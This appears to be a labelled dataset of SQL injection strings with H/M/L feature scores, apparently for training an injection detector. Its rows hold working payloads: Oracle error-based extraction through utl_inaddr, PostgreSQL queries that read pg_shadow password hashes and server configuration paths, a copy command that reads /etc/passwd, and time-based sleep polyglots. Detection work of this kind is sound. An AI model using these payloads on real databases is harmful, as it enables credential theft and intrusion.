sqli	d_char	d_token	punck	s_token	space	length	alw_true	output
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	H	H	M	H	H	H	H	H
select version();	L	L	M	L	L	L	L	L
select current_database();	L	L	M	L	L	M	L	L
select current_user;	L	M	L	L	L	L	L	L
select session_user;	L	M	L	L	L	L	L	L
select current_setting('log_connections');	M	M	M	L	L	M	L	H
select current_setting('log_statement');	M	M	M	L	L	M	L	H
select current_setting('port');	M	M	M	L	L	M	L	H
select current_setting('password_encryption');	M	M	M	L	L	M	L	H
select current_setting('krb_server_keyfile');	M	M	M	L	L	M	L	H
select current_setting('virtual_host');	M	M	M	L	L	M	L	H
select current_setting('port');	M	M	M	L	L	M	L	H
select current_setting('config_file');	M	M	M	L	L	M	L	H
select current_setting('hba_file');	M	M	M	L	L	M	L	H
select current_setting('data_directory');	M	M	M	L	L	M	L	H
select * from pg_shadow;	L	M	L	L	M	M	L	L
select * from pg_group;	L	M	L	L	M	M	L	L
create table myfile (input text);	L	L	M	L	M	M	L	L
copy myfile from '/etc/passwd'; 	M	L	L	M	M	M	L	H
select * from myfile;copy myfile to /tmp/test;	L	L	M	M	M	M	L	H
sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	M	M	M	M	M	M	L	H
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	M	M	M	M	M	M	L	H
